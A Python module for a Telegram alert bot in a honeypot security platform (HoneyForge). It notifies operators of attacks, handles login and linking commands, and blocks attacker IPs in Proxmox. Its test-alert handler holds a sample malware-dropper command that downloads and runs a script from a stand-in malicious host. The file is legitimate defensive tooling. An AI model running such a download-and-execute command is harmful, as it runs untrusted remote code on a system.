import asyncio
import html
import json
import os
import time
import traceback
from typing import Any, Dict, List, Optional, Tuple

import httpx

# Исправляем socks5h:// на socks5:// в окружении для совместимости с httpx
for k in ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"]:
    if os.environ.get(k, "").startswith("socks5h://"):
        os.environ[k] = os.environ[k].replace("socks5h://", "socks5://")

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
CENTER_URL = os.getenv("HF_CENTER_URL", os.getenv("CENTER_URL", "http://center:4000")).rstrip("/")
ORCH_TOKEN = os.getenv("ORCH_TOKEN", "")


def get_proxy_url() -> Optional[str]:
    proxy_url = os.getenv("TELEGRAM_PROXY")
    if proxy_url and proxy_url.startswith("socks5h://"):
        proxy_url = proxy_url.replace("socks5h://", "socks5://")
    return proxy_url if proxy_url else None


async def get_center_subscribers() -> List[str]:
    """Получает список chat_id авторизованных операторов из центра управления."""
    url = f"{CENTER_URL}/api/internal/telegram/subscribers"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        # trust_env=False: не пускать внутренний трафик через SOCKS5-прокси
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.get(url, headers=headers)
            if resp.status_code == 200:
                subs = resp.json().get("subscribers", [])
                return [str(s["chat_id"]) for s in subs if s.get("chat_id")]
    except Exception as e:
        print(f"⚠️ Не удалось получить подписчиков из центра ({e})")
    return []


async def check_user_auth(chat_id: str | int) -> Dict[str, Any]:
    """Проверяет привязку chat_id к активному оператору/админу центра."""
    url = f"{CENTER_URL}/api/internal/telegram/check-auth"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(url, json={"chat_id": str(chat_id)}, headers=headers)
            if resp.status_code == 200:
                return resp.json()
    except Exception as e:
        print(f"⚠️ Ошибка проверки авторизации в центре: {e}")

    # Fallback: если центр временно недоступен, но chat_id совпадает с TELEGRAM_CHAT_ID из .env
    if TELEGRAM_CHAT_ID and str(chat_id) == str(TELEGRAM_CHAT_ID):
        return {"authenticated": True, "username": "admin (fallback)", "role": "admin"}
    return {"authenticated": False}


async def bind_user_by_code(code: str, chat_id: str | int, username: Optional[str] = None) -> Tuple[bool, str]:
    """Привязывает Telegram chat_id к пользователю HoneyForge по одноразовому коду."""
    url = f"{CENTER_URL}/api/internal/telegram/bind"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(
                url,
                json={"code": code.strip().upper(), "chat_id": str(chat_id), "username": username},
                headers=headers,
            )
            if resp.status_code == 200:
                data = resp.json()
                return True, f"Оператор: <b>{data.get('username')}</b> (роль: <code>{data.get('role')}</code>)"
            detail = resp.json().get("detail", "Ошибка привязки")
            return False, detail
    except Exception as e:
        return False, f"Ошибка связи с центром: {e}"


async def login_user_by_password(username: str, password: str, chat_id: str | int, tg_username: Optional[str] = None) -> Tuple[bool, str]:
    """Прямая авторизация оператора в Telegram по логину и паролю."""
    url = f"{CENTER_URL}/api/internal/telegram/login"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(
                url,
                json={"username": username.strip(), "password": password.strip(), "chat_id": str(chat_id), "tg_username": tg_username},
                headers=headers,
            )
            if resp.status_code == 200:
                data = resp.json()
                return True, f"Вы авторизованы как <b>{data.get('username')}</b> (роль: <code>{data.get('role')}</code>)"
            detail = resp.json().get("detail", "Неверный логин или пароль")
            return False, detail
    except Exception as e:
        return False, f"Ошибка связи с центром: {e}"


async def unbind_user(chat_id: str | int) -> bool:
    """Отвязывает Telegram chat_id."""
    url = f"{CENTER_URL}/api/internal/telegram/unbind"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(url, json={"chat_id": str(chat_id)}, headers=headers)
            return resp.status_code == 200
    except Exception:
        return False


async def send_alert(event_name: str, attacker_ip: str, properties: dict, chat_ids: Optional[List[str]] = None):
    """
    Отправляет уведомление об атаке в Telegram всем привязанным операторам.
    """
    token = os.getenv("TELEGRAM_BOT_TOKEN", TELEGRAM_BOT_TOKEN)
    if not token:
        print("⚠️ [Telegram Alert] Не задан TELEGRAM_BOT_TOKEN — алерт пропущен.", flush=True)
        return

    # Собираем список адресатов
    targets = list(chat_ids or [])
    if not targets:
        targets = await get_center_subscribers()
    
    env_chat_id = os.getenv("TELEGRAM_CHAT_ID", TELEGRAM_CHAT_ID)
    if not targets and env_chat_id:
        targets = [str(env_chat_id)]

    if not targets:
        print(f"ℹ️ [Telegram Alert] Алерт '{event_name}' ({attacker_ip}) получен, но нет привязанных операторов! Выполните /login или /link в боте.", flush=True)
        return

    print(f"📤 [Telegram Alert] Отправка алерта '{event_name}' ({attacker_ip}) операторам: {targets}", flush=True)

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    proxy_url = get_proxy_url()

    # Проверяем, заблокирован ли уже этот IP в Proxmox
    is_blocked = False
    try:
        from app.services.proxmox_manager import ProxmoxManager
        pm = ProxmoxManager.from_env()
        is_blocked = pm.is_ip_blocked(attacker_ip)
    except Exception:
        pass

    ip_status_badge = " 🛑 <i>[УЖЕ ЗАБЛОКИРОВАН В PROXMOX]</i>" if is_blocked else ""
    block_button = (
        {"text": "🛡️ IP уже в бане Proxmox", "callback_data": f"noop_{attacker_ip}"}
        if is_blocked
        else {"text": "❌ Заблокировать IP", "callback_data": f"block_{attacker_ip}"}
    )

    # Форматируем детали
    details = html.escape(json.dumps(properties, indent=2, ensure_ascii=False))
    message = (
        f"🚨 <b>НОВАЯ АТАКА В HONEYFORGE!</b>\n\n"
        f"<b>Тип события:</b> {html.escape(event_name)}\n"
        f"<b>IP хакера:</b> <code>{html.escape(attacker_ip)}</code>{ip_status_badge}\n\n"
        f"<b>Детали (Payload):</b>\n<pre>{details}</pre>"
    )

    for cid in targets:
        payload = {
            "chat_id": cid,
            "text": message,
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [
                    [
                        block_button,
                        {"text": "🗑️ Скрыть", "callback_data": "ignore"},
                    ]
                ]
            },
        }
        try:
            async with httpx.AsyncClient(proxy=proxy_url, timeout=10.0) as client:
                response = await client.post(url, json=payload)
                if response.status_code != 200:
                    print(f"❌ Ошибка Telegram (chat_id={cid}, код {response.status_code}): {response.text}", flush=True)
                else:
                    print(f"✅ Уведомление успешно отправлено в Telegram (chat_id={cid})", flush=True)
        except Exception as e:
            print(f"❌ Ошибка соединения с Telegram при отправке на {cid}: {e}", flush=True)


async def _tg_post(client: httpx.AsyncClient, base_tg: str, method: str, json_data: dict, timeout: float = 10.0) -> Optional[httpx.Response]:
    """Безопасная отправка POST-запроса в Telegram API с индивидуальным таймаутом."""
    try:
        resp = await client.post(f"{base_tg}/{method}", json=json_data, timeout=timeout)
        return resp
    except Exception as exc:
        print(f"⚠️ Ошибка вызова Telegram API ({method}): {exc}", flush=True)
        return None


async def _handle_telegram_update(tg_client: httpx.AsyncClient, base_tg: str, update: dict):
    """Изолированная обработка одного события от Telegram (сообщение или callback)."""
    # 1. ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ И КОМАНД
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "").strip()
        from_user = msg.get("from", {})
        tg_username = from_user.get("username")

        if not text:
            return

        print(f"📩 Telegram сообщение от chat_id={chat_id} (@{tg_username}): {text!r}", flush=True)

        # Команда быстрой авторизации по логину и паролю: /login admin <пароль>
        if text.startswith("/login"):
            parts = text.split(maxsplit=2)
            # Пытаемся сразу удалить сообщение с открытым паролем из чата для безопасности
            msg_id = msg.get("message_id")
            if msg_id:
                await _tg_post(tg_client, base_tg, "deleteMessage", {"chat_id": chat_id, "message_id": msg_id})

            if len(parts) >= 3:
                login_user = parts[1].strip()
                login_pwd = parts[2].strip()
                success, info = await login_user_by_password(login_user, login_pwd, chat_id, tg_username)
                if success:
                    reply_text = (
                        f"🎉 <b>Авторизация успешна!</b>\n\n"
                        f"{info}\n\n"
                        f"🛡️ Ваш Telegram успешно привязан к HoneyForge. "
                        f"Теперь вам моментально будут приходить алерты об атаках!\n\n"
                        f"Отправьте <code>/test</code> чтобы протестировать получение алерта."
                    )
                else:
                    reply_text = f"❌ <b>Ошибка входа:</b> {html.escape(info)}"
            else:
                reply_text = (
                    "ℹ️ <b>Формат команды:</b> <code>/login &lt;логин&gt; &lt;пароль&gt;</code>\n\n"
                    "Пример: <code>/login admin mypassword</code>\n\n"
                    "<i>Сообщение с паролем удаляется ботом сразу же после обработки.</i>"
                )
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML"})

        # Команда привязки по одноразовому коду: /start HF-XXXXXX, /link HF-XXXXXX или /bind HF-XXXXXX
        elif text.startswith("/start") or text.startswith("/link") or text.startswith("/bind"):
            parts = text.split(maxsplit=1)
            if len(parts) > 1 and parts[1].strip():
                code = parts[1].strip()
                success, info = await bind_user_by_code(code, chat_id, tg_username)
                if success:
                    reply_text = (
                        f"🎉 <b>Telegram успешно привязан к платформе HoneyForge!</b>\n\n"
                        f"{info}\n\n"
                        f"🛡️ Теперь вам будут приходить оперативные алерты об атаках, "
                        f"и вы можете блокировать IP хакеров прямо отсюда.\n\n"
                        f"Отправьте <code>/test</code> для проверки получения алерта."
                    )
                else:
                    reply_text = (
                        f"❌ <b>Ошибка привязки:</b> {html.escape(info)}\n\n"
                        f"Сгенерируйте свежий код в веб-панели HoneyForge "
                        f"(в правом верхнем углу: <i>«Подключить Telegram»</i>)."
                    )
            else:
                auth_status = await check_user_auth(chat_id)
                if auth_status.get("authenticated"):
                    reply_text = (
                        f"👋 <b>Добро пожаловать в HoneyForge SOC!</b>\n\n"
                        f"Вы авторизованы как <b>{auth_status.get('username')}</b> "
                        f"(роль: <code>{auth_status.get('role')}</code>).\n"
                        f"🆔 Ваш Chat ID: <code>{chat_id}</code>\n\n"
                        f"Бот подключен и готов присылать алерты.\n"
                        f"Отправьте <code>/test</code> для тестового алерта."
                    )
                else:
                    reply_text = (
                        f"👋 <b>Добро пожаловать в HoneyForge SOC Bot!</b>\n\n"
                        f"🔒 <i>Бот предназначен для операторов и администраторов платформы HoneyForge.</i>\n\n"
                        f"🆔 <b>Ваш Telegram Chat ID:</b> <code>{chat_id}</code>\n\n"
                        f"<b>Как привязать свой аккаунт:</b>\n"
                        f"1. <b>Быстрый вход:</b> отправьте <code>/login admin &lt;пароль&gt;</code>\n"
                        f"2. <b>Через веб-панель:</b> сгенерируйте код в меню и отправьте <code>/link &lt;код&gt;</code>\n"
                        f"3. <b>В .env:</b> укажите <code>TELEGRAM_CHAT_ID={chat_id}</code> на сервере."
                    )

            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML"})

        # Команда проверки тестового алерта прямо в чат
        elif text in ("/test", "/test_alert"):
            test_props = {
                "rule": "test_verification",
                "trap": "honeypot-ssh-01",
                "payload": "cd /tmp && wget http://malware.cc/payload.sh && ./payload.sh",
                "time": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            }
            await send_alert("SSH Malware Dropper (TEST)", "198.51.100.99", test_props, chat_ids=[str(chat_id)])
            reply_text = "🚀 <b>Тестовый алерт отправлен выше!</b> Проверьте сообщение и кнопки реагирования."
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML"})

        elif text == "/status":
            auth_status = await check_user_auth(chat_id)
            if auth_status.get("authenticated"):
                reply_text = (
                    f"🛡️ <b>HoneyForge SOC — Статус</b>\n\n"
                    f"🟢 <b>Статус:</b> Авторизован\n"
                    f"👤 <b>Пользователь:</b> {auth_status.get('username')}\n"
                    f"🔑 <b>Роль:</b> <code>{auth_status.get('role')}</code>\n"
                    f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n\n"
                    f"✅ Вам разрешено получение алертов и блокировка IP в Proxmox.\n"
                    f"Отправьте <code>/test</code> для тестового алерта."
                )
            else:
                reply_text = (
                    f"🔒 <b>Вы не авторизованы.</b>\n\n"
                    f"🆔 <b>Ваш Telegram Chat ID:</b> <code>{chat_id}</code>\n\n"
                    f"<b>Как подключить получение алертов:</b>\n"
                    f"1. <b>Быстрый вход:</b> отправьте боту <code>/login admin &lt;пароль&gt;</code>\n"
                    f"2. <b>Через веб-панель:</b> войдите в панель и используйте <code>/link &lt;код&gt;</code>\n"
                    f"3. <b>В .env:</b> пропишите <code>TELEGRAM_CHAT_ID={chat_id}</code> на сервере."
                )
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML"})

        elif text == "/unlink":
            await unbind_user(chat_id)
            await _tg_post(
                tg_client,
                base_tg,
                "sendMessage",
                {
                    "chat_id": chat_id,
                    "text": "🔌 <b>Telegram успешно отвязан от вашего аккаунта HoneyForge.</b>",
                    "parse_mode": "HTML",
                },
            )

        elif text in ("/help", "/info"):
            reply_text = (
                f"📖 <b>Команды HoneyForge Bot:</b>\n\n"
                f"• <code>/status</code> — статус авторизации и ваш Chat ID\n"
                f"• <code>/login &lt;логин&gt; &lt;пароль&gt;</code> — быстрая авторизация оператора\n"
                f"• <code>/link &lt;код&gt;</code> — привязать аккаунт по коду из веб-панели\n"
                f"• <code>/test</code> — отправить тестовый алерт об атаке\n"
                f"• <code>/unlink</code> — отвязать Telegram\n"
                f"• <code>/help</code> — список команд\n\n"
                f"🆔 Ваш Chat ID: <code>{chat_id}</code>"
            )
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML"})

    # 2. ОБРАБОТКА НАЖАТИЙ КНОПОК (CALLBACK QUERY)
    elif "callback_query" in update:
        cb = update["callback_query"]
        cb_data = cb.get("data", "")
        cb_id = cb["id"]
        msg_obj = cb.get("message", {})
        message_id = msg_obj.get("message_id")
        chat_id = msg_obj.get("chat", {}).get("id")
        from_user = cb.get("from", {})
        from_user_id = from_user.get("id")
        from_username = from_user.get("username", "неизвестно")

        # ПРОВЕРКА ПРАВ: разрешать действия ТОЛЬКО авторизованным операторам!
        auth_status = await check_user_auth(from_user_id)
        if not auth_status.get("authenticated"):
            await _tg_post(
                tg_client,
                base_tg,
                "answerCallbackQuery",
                {
                    "callback_query_id": cb_id,
                    "text": "⛔ Доступ запрещён! Ваш Telegram не привязан к аккаунту оператора HoneyForge.",
                    "show_alert": True,
                },
            )
            return

        operator_name = auth_status.get("username")
        operator_mention = f"@{from_username} ({operator_name})"

        # Кнопка "Заблокировать IP"
        if cb_data.startswith("block_"):
            ip_to_block = cb_data.split("_")[1]
            print(f"🛡️ Команда блокировки IP {ip_to_block} от оператора {operator_name} (tg={from_user_id})", flush=True)

            try:
                from app.services.proxmox_manager import ProxmoxManager
                pm = ProxmoxManager.from_env()
                pm.block_ip(ip_to_block)
                block_status_text = f"🛑 <b>ВЕРДИКТ:</b> IP {ip_to_block} ЗАБЛОКИРОВАН В PROXMOX!"
            except Exception as ex:
                print(f"❌ Ошибка блокировки в Proxmox: {ex}", flush=True)
                block_status_text = f"⚠️ <b>ВЕРДИКТ:</b> Ошибка блокировки IP в Proxmox ({ex})"

            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": f"IP {ip_to_block} ЗАБЛОКИРОВАН!"})

            if chat_id and message_id:
                current_text = msg_obj.get("text", "")
                await _tg_post(
                    tg_client,
                    base_tg,
                    "editMessageText",
                    {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": f"{current_text}\n\n{block_status_text}\n<i>Оператор: {operator_mention}</i>",
                        "parse_mode": "HTML",
                        "reply_markup": {"inline_keyboard": []},
                    },
                )

        # Кнопка "Игнорировать / Скрыть"
        elif cb_data == "ignore":
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Алерт скрыт."})
            if chat_id and message_id:
                await _tg_post(
                    tg_client,
                    base_tg,
                    "editMessageText",
                    {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": f"<i>Алерт скрыт оператором {operator_mention}.</i>",
                        "parse_mode": "HTML",
                        "reply_markup": {"inline_keyboard": []},
                    },
                )

        # Клик по уже заблокированному IP
        elif cb_data.startswith("noop_"):
            ip_val = cb_data.split("_")[1]
            await _tg_post(
                tg_client,
                base_tg,
                "answerCallbackQuery",
                {
                    "callback_query_id": cb_id,
                    "text": f"🛡️ IP {ip_val} уже заблокирован в фаерволе Proxmox!",
                    "show_alert": True,
                },
            )


async def _run_polling_session() -> bool:
    """
    Один сеанс long-polling с собственным жизненным циклом httpx.AsyncClient.
    Возвращает True для немедленного перезапуска сеанса (при разрыве соединения),
    или False при отсутствии токена / фатальных ошибках.
    """
    token = os.getenv("TELEGRAM_BOT_TOKEN", TELEGRAM_BOT_TOKEN)
    proxy_url = get_proxy_url()

    if not token:
        print("ℹ️ TELEGRAM_BOT_TOKEN не задан в .env, ожидание конфигурации...", flush=True)
        await asyncio.sleep(20)
        return False

    base_tg = f"https://api.telegram.org/bot{token}"

    # 1. Проверяем связь с Telegram API
    bot_info = None
    try:
        async with httpx.AsyncClient(proxy=proxy_url, timeout=12.0) as check_client:
            me_resp = await check_client.get(f"{base_tg}/getMe")
            if me_resp.status_code == 200:
                bot_info = me_resp.json().get("result", {})
                print(f"🤖 [Telegram Bot] Связь установлена: @{bot_info.get('username')} ({bot_info.get('first_name')}) [прокси: {proxy_url or 'напрямую'}]", flush=True)
            elif me_resp.status_code == 401:
                print("❌ [Telegram Bot] HTTP 401 Unauthorized: неверный TELEGRAM_BOT_TOKEN!", flush=True)
                await asyncio.sleep(30)
                return False
            else:
                print(f"⚠️ [Telegram Bot] Ответ getMe HTTP {me_resp.status_code}: {me_resp.text}", flush=True)
    except Exception as e:
        print(f"⚠️ [Telegram Bot] Не удалось достучаться до API через {proxy_url or 'прямое соединение'}: {e}", flush=True)
        await asyncio.sleep(5)
        return True

    # 2. Сбрасываем возможные зависшие вебхуки для включения getUpdates
    try:
        async with httpx.AsyncClient(proxy=proxy_url, timeout=10.0) as setup_client:
            await setup_client.post(f"{base_tg}/deleteWebhook", json={"drop_pending_updates": False})
    except Exception:
        pass

    # 3. Настройка HTTP-клиента с устойчивыми таймаутами для long-polling
    #    getUpdates держит соединение 25с, поэтому read_timeout = 45с гарантирует защиту от ложных обрывов
    poll_timeout = httpx.Timeout(connect=15.0, read=45.0, write=15.0, pool=15.0)
    limits = httpx.Limits(max_keepalive_connections=2, max_connections=5, keepalive_expiry=20.0)

    offset = 0
    last_heartbeat = time.time()
    bot_username = bot_info.get("username") if bot_info else "bot"

    print(f"✅ [Telegram Bot] Лонг-поллинг запущен для @{bot_username}!", flush=True)

    async with httpx.AsyncClient(proxy=proxy_url, timeout=poll_timeout, limits=limits) as tg_client:
        while True:
            # Периодический пульс (heartbeat) раз в 10 минут
            if time.time() - last_heartbeat > 600:
                print(f"💓 [Telegram Bot] Поллинг активен, @{bot_username} онлайн.", flush=True)
                last_heartbeat = time.time()

            try:
                resp = await tg_client.get(
                    f"{base_tg}/getUpdates",
                    params={
                        "offset": offset,
                        "timeout": 25,
                        "allowed_updates": json.dumps(["message", "callback_query"]),
                    },
                )
            except httpx.ReadTimeout:
                # Штатный таймаут лонг-поллинга при отсутствии входящих сообщений
                continue
            except (
                httpx.ConnectError,
                httpx.ConnectTimeout,
                httpx.ProxyError,
                httpx.RemoteProtocolError,
                httpx.NetworkError,
                OSError,
            ) as net_err:
                # Разрыв прокси или сетевого сокета: выходим из сессии для чистого пересоздания пула сокетов
                print(f"⚠️ [Telegram Bot] Сетевой сбой ({type(net_err).__name__}: {net_err}). Сброс пула и переподключение через 3с...", flush=True)
                await asyncio.sleep(3)
                return True

            if resp.status_code == 409:
                print("⚠️ [Telegram Bot] HTTP 409 Conflict (параллельный запуск контейнера или старый вебхук). Пауза 5с...", flush=True)
                await asyncio.sleep(5)
                continue
            elif resp.status_code == 401:
                print("❌ [Telegram Bot] HTTP 401 Unauthorized — проверьте TELEGRAM_BOT_TOKEN!", flush=True)
                await asyncio.sleep(30)
                return False
            elif resp.status_code != 200:
                print(f"❌ [Telegram Bot] getUpdates HTTP {resp.status_code}: {resp.text}", flush=True)
                await asyncio.sleep(4)
                continue

            try:
                data = resp.json()
            except Exception as j_err:
                print(f"⚠️ [Telegram Bot] Ошибка парсинга JSON: {j_err}", flush=True)
                await asyncio.sleep(2)
                continue

            for update in data.get("result", []):
                offset = max(offset, update["update_id"] + 1)
                try:
                    await _handle_telegram_update(tg_client, base_tg, update)
                except Exception as u_err:
                    print(f"⚠️ [Telegram Bot] Ошибка обработки update {update.get('update_id')}: {u_err}", flush=True)


async def start_polling():
    """
    Бессмертный супервизор Telegram Long-Polling.
    Непрерывно перезапускает поллинг при любых сетевых сбоях, обрывах SOCKS5-прокси,
    перезагрузках роутеров или временных ошибках API Telegram.
    """
    print("🚀 [Telegram Supervisor] Запуск неубиваемого диспетчера Telegram-бота...", flush=True)
    consecutive_errors = 0

    while True:
        try:
            should_retry = await _run_polling_session()
            consecutive_errors = 0
            if not should_retry:
                await asyncio.sleep(10)
        except asyncio.CancelledError:
            print("🛑 [Telegram Supervisor] Поллинг остановлен по сигналу завершения процесса.", flush=True)
            break
        except Exception as exc:
            consecutive_errors += 1
            wait_time = min(30, 2 + consecutive_errors * 2)
            print(f"🚨 [Telegram Supervisor] Непредвиденный сбой ({type(exc).__name__}: {exc}). Перезапуск через {wait_time}с...", flush=True)
            traceback.print_exc()
            await asyncio.sleep(wait_time)

